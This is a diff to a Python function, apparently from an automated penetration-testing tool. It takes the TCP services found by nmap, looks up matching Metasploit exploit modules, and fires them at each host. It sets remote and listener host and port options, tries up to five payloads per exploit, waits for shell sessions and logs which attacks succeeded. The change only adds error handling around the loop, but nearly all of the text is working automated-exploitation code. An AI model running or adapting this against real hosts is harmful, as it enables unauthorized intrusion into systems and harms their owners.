@@ -125,126 +125,142 @@ def exploitHost(host):
 		os.system('cd / && cd ' + startDir[1:] + ' && mkdir ' + hostDir)
 	except Exception as e:
 		print(e)
-	for port in nm[host]['tcp'].keys():
-		serviceExploited = False
-		dfLen = 0
-		service = str(nm[host]['tcp'][port]['name'])
-		details = str(nm[host]['tcp'][port]['product']) + " " + str(nm[host]['tcp'][port]['version'])
-		exploitFilePath = findModules(service, details, port, host)
-		if exploitFilePath == "error":
-			print("  No file returned from called method.")
-		else:
-			# initial read of file
-			with open(exploitFilePath) as csvfile:
-				readCSV = csvfile.read()
-				df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
-			dfLen = len(df.index)
-			if dfLen == 0: # if the file was read but says no modules
-				if os.stat(exploitFilePath).st_size > 46: # files with modules should be > 46 so we shoudnt be having problems... PANDAS
-					print("  ****** why is df size 0! *******")
-					time.sleep(1)
-					df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name']) # try one more time
-					dfLen = len(df.index) # should be greater than 0 - modules will run after above print is made if this worked
-				else: # file was read, dfLen is 0, and file size is small so probably correct
-					dfLen = 0
-					print("  No modules found")
+	try:
+		for port in nm[host]['tcp'].keys():
+			serviceExploited = False
+			dfLen = 0
+			service = str(nm[host]['tcp'][port]['name'])
+			details = str(nm[host]['tcp'][port]['product']) + " " + str(nm[host]['tcp'][port]['version'])
+			exploitFilePath = findModules(service, details, port, host)
+			if exploitFilePath == "error":
+				print("  No file returned from called method.")
+			else:
+				# initial read of file
+				with open(exploitFilePath) as csvfile:
+					readCSV = csvfile.read()
+					df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
+				dfLen = len(df.index)
+				if dfLen == 0: # if the file was read but says no modules
+					if os.stat(exploitFilePath).st_size > 46: # files with modules should be > 46 so we shoudnt be having problems... PANDAS
+						print("  ****** why is df size 0! *******")
+						time.sleep(1)
+						df = pd.read_csv(StringIO(readCSV), skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name']) # try one more time
+						dfLen = len(df.index) # should be greater than 0 - modules will run after above print is made if this worked
+					else: # file was read, dfLen is 0, and file size is small so probably correct
+						dfLen = 0
+						print("  No modules found")
 
-			if dfLen > 0:
-				numServWithMods += 1
+				if dfLen > 0:
+					numServWithMods += 1
 
-				for index, row in df.iterrows():
-					if len(client.sessions.list) < 1:
-						result = "Fail"
-						keepRunning = True
-						global lport
-						lport += 1 # increment lport so that modules arent trying to use the same lport
-						exploitName = row['Name'][8:]
-						print("  Attempting module: " + exploitName)
-						exploitObj = client.modules.use('exploit', exploitName)
-						if len(exploitObj.payloads) >= 1:
-							try: # set remote host
-								exploitObj['RHOSTS'] = host
-							except:
-								try:
-									exploitObj['RHOST'] = host
+					for index, row in df.iterrows():
+						if len(client.sessions.list) < 1:
+							result = "Fail"
+							keepRunning = True
+							global lport
+							lport += 1 # increment lport so that modules arent trying to use the same lport
+							exploitName = row['Name'][8:]
+							print("  Attempting module: " + exploitName)
+							exploitObj = client.modules.use('exploit', exploitName)
+							if len(exploitObj.payloads) >= 1:
+								try: # set remote host
+									exploitObj['RHOSTS'] = host
 								except:
-									pass
-							try: # set port number
-								exploitObj['RPORT'] = port
-							except:
-								try:
-									exploitObj['RPORTS'] = port
+									try:
+										exploitObj['RHOST'] = host
+									except:
+										pass
+								try: # set port number
+									exploitObj['RPORT'] = port
 								except:
-									pass
+									try:
+										exploitObj['RPORTS'] = port
+									except:
+										pass
 
-							if len(exploitObj.missing_required) > 0:
-								for item in exploitObj.missing_required:
-									print("    Item not set: " + item)
-								print("    Exiting exploit: " + exploitName)
-								keepRunning = False
+								if len(exploitObj.missing_required) > 0:
+									for item in exploitObj.missing_required:
+										print("    Item not set: " + item)
+									print("    Exiting exploit: " + exploitName)
+									keepRunning = False
 
-							i = 0
-							while (i < len(exploitObj.payloads) and i < 5) and keepRunning == True and len(client.sessions.list) < 1:
-								try:
-									payloadName = exploitObj.payloads[i]
-									payloadObj = client.modules.use('payload', payloadName)
-									try: # set remote host
-										payloadObj['RHOSTS'] = host
-									except:
-										try:
-											payloadObj['RHOST'] = host
+								i = 0
+								while (i < len(exploitObj.payloads) and i < 5) and keepRunning == True and len(client.sessions.list) < 1:
+									try:
+										payloadName = exploitObj.payloads[i]
+										payloadObj = client.modules.use('payload', payloadName)
+										try: # set remote host
+											payloadObj['RHOSTS'] = host
 										except:
-											pass
-									try: # set port number
-										payloadObj['RPORT'] = port
-									except:
-										try:
-											payloadObj['RPORTS'] = port
+											try:
+												payloadObj['RHOST'] = host
+											except:
+												pass
+										try: # set port number
+											payloadObj['RPORT'] = port
 										except:
-											pass
-									try: # set port number
-										payloadObj['LPORT'] = lport
-									except:
-										try:
-											payloadObj['LPORTS'] = lport
+											try:
+												payloadObj['RPORTS'] = port
+											except:
+												pass
+										try: # set port number
+											payloadObj['LPORT'] = lport
 										except:
-											pass
-									try: # set port number
-										payloadObj['LHOST'] = IP
-									except:
-										try:
+											try:
+												payloadObj['LPORTS'] = lport
+											except:
+												pass
+										try: # set port number
 											payloadObj['LHOST'] = IP
 										except:
-											pass
+											try:
+												payloadObj['LHOST'] = IP
+											except:
+												pass
 
-									print("    Trying payload: " + payloadName)
-									if len(payloadObj.missing_required) > 0:
-										for item in payloadObj.missing_required:
-											print("      Item not set: " + item)
-										print("      Exiting payload: " + payloadName)
+										print("    Trying payload: " + payloadName)
+										if len(payloadObj.missing_required) > 0:
+											for item in payloadObj.missing_required:
+												print("      Item not set: " + item)
+											print("      Exiting payload: " + payloadName)
+											i += 1
+										else:
+											try:
+												exploitObj.execute(payload=payloadObj)
+												hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payloadName), 'Result':result}
+												exploitObjects.append(hostExploits)
+												i += 1
+											except:
+												print("      Bad Payload. Moving on.")
+												i += 1
+
+
+											#failedToRun = False
+									except Exception as e:
+										print(e)
 										i += 1
-									else:
-										try:
-											exploitObj.execute(payload=payloadObj)
-											hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payloadName), 'Result':result}
-											exploitObjects.append(hostExploits)
-											i += 1
-										except:
-											print("      Bad Payload. Moving on.")
-											i += 1
+							else:
+								print("  No payloads available for: " + exploitName)
 
-
-										#failedToRun = False
-								except Exception as e:
-									print(e)
-									i += 1
-						else:
-							print("  No payloads available for: " + exploitName)
-
-				# check that all modules (jobs) are complete
-				sleepCount = 0
-				if len(client.jobs.list) > 0: # still have jobs running so wait a max of 30 secondds if not exploited before
-					while len(client.jobs.list) > 0 and sleepCount < 30 and serviceExploited == False:
+					# check that all modules (jobs) are complete
+					sleepCount = 0
+					if len(client.jobs.list) > 0: # still have jobs running so wait a max of 30 secondds if not exploited before
+						while len(client.jobs.list) > 0 and sleepCount < 30 and serviceExploited == False:
+							if len(client.sessions.list) > 0:
+								for job in client.jobs.list:
+									client.jobs.stop(job)
+								numServExploited += 1
+								serviceExploited = True
+								for index in client.sessions.list:
+									for item in exploitObjects:
+										if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]) and item["Port"] == str(client.sessions.list[index]['session_port']):
+											item['Result'] = 'Success'
+									client.sessions.session(index).stop()
+							else:
+								time.sleep(1)
+								sleepCount += 1
+					else:
+						time.sleep(2)
 						if len(client.sessions.list) > 0:
 							for job in client.jobs.list:
 								client.jobs.stop(job)
@@ -255,29 +271,15 @@ def exploitHost(host):
 									if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]) and item["Port"] == str(client.sessions.list[index]['session_port']):
 										item['Result'] = 'Success'
 								client.sessions.session(index).stop()
-						else:
-							time.sleep(1)
-							sleepCount += 1
-				else:
-					time.sleep(2)
-					if len(client.sessions.list) > 0:
-						for job in client.jobs.list:
-							client.jobs.stop(job)
-						numServExploited += 1
-						serviceExploited = True
-						for index in client.sessions.list:
-							for item in exploitObjects:
-								if item["Exploit"] in str(client.sessions.list[index]['via_exploit']) and item["Payload"] == str(client.sessions.list[index]['via_payload'][8:]) and item["Port"] == str(client.sessions.list[index]['session_port']):
-									item['Result'] = 'Success'
-							client.sessions.session(index).stop()
 
-		if serviceExploited == False:
-			print("  Service on port " + str(port) + " not exploited.")
-			for job in client.jobs.list:
-				client.jobs.stop(job)
-		else:
-			print("  Service on port " + str(port) + " was exploited!")
-
+			if serviceExploited == False:
+				print("  Service on port " + str(port) + " not exploited.")
+				for job in client.jobs.list:
+					client.jobs.stop(job)
+			else:
+				print("  Service on port " + str(port) + " was exploited!")
+	except:
+		print("No 'TCP' keys found for host: " + host)
 	try:
 		outDir = host.replace(".","-")
 		csv_file = outDir + '/exploits.csv'
